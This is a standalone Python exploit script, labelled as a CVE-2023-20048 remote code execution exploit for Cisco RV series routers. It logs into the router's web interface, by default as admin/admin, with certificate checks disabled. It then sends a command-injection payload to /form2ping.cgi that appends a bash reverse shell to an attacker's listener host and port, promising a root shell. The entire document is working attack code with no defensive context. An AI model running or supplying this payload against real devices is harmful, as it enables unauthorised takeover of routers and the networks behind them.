#!/usr/bin/env python3
import requests
import argparse
import sys
from urllib3.exceptions import InsecureRequestWarning

# Disable SSL warnings (for self-signed certs)
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def exploit(target, username, password, lhost, lport):
    # Step 1: Login to get session cookie
    session = requests.Session()
    login_url = f"https://{target}/login.cgi"
    login_data = {"username": username, "password": password, "submit": "Login"}
    
    try:
        login_response = session.post(login_url, data=login_data, verify=False, timeout=10)
        if "logout.cgi" not in login_response.text:
            print("[!] Login failed. Check credentials.")
            return False
    except Exception as e:
        print(f"[!] Login error: {e}")
        return False

    # Step 2: Exploit command injection in /form2ping.cgi
    exploit_url = f"https://{target}/form2ping.cgi"
    payload = f"ip=127.0.0.1;bash -i >& /dev/tcp/{lhost}/{lport} 0>&1&submit=OK"
    
    try:
        print("[+] Sending payload...")
        session.post(exploit_url, data=payload, verify=False, timeout=10)
        print("[+] Check your listener for a root shell!")
    except Exception as e:
        print(f"[!] Exploit failed: {e}")
        return False

    return True

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CVE-2023-20048 RCE Exploit (Cisco RV Series)")
    parser.add_argument("-t", "--target", required=True, help="Target router IP")
    parser.add_argument("-u", "--username", default="admin", help="Admin username")
    parser.add_argument("-p", "--password", default="admin", help="Admin password")
    parser.add_argument("--lhost", required=True, help="Listener IP for reverse shell")
    parser.add_argument("--lport", required=True, help="Listener port for reverse shell")
    args = parser.parse_args()

    print(f"[*] Exploiting {args.target}...")
    exploit(args.target, args.username, args.password, args.lhost, args.lport)
